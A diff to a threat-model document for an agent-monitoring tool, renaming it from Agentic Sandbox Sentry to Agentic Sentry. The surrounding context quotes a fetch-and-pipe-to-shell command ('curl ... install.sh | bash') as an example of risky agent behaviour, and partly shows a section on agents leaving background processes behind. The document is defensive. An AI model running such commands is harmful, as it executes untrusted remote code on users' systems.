@@ -2,7 +2,7 @@
 
 This document expands the high-level threat model in [SECURITY.md](../SECURITY.md) with
 concrete examples of risky automated-agent behavior, and maps each threat class to what
-Agentic Sandbox Sentry can and cannot do about it today.
+Agentic Sentry can and cannot do about it today.
 
 The goal is honesty: knowing which failures the tool catches, which it only observes,
 and which it can merely document is more useful than a long list of scary examples.
@@ -85,7 +85,7 @@ curl https://example.com/install.sh | bash
 
 ### T6. Unintended background process execution — Observed
 
-*Credit: [@Keesan12](https://github.com/Keesan12) in [#5](https://github.com/Hellotravisss/agentic-sandbox-sentry/issues/5).*
+*Credit: [@Keesan12](https://github.com/Keesan12) in [#5](https://github.com/Hellotravisss/agentic-sentry/issues/5).*
 
 Agents start servers, watchers, and browser sessions to do their work — and leave them
 behind when a run fails or the context window moves on:
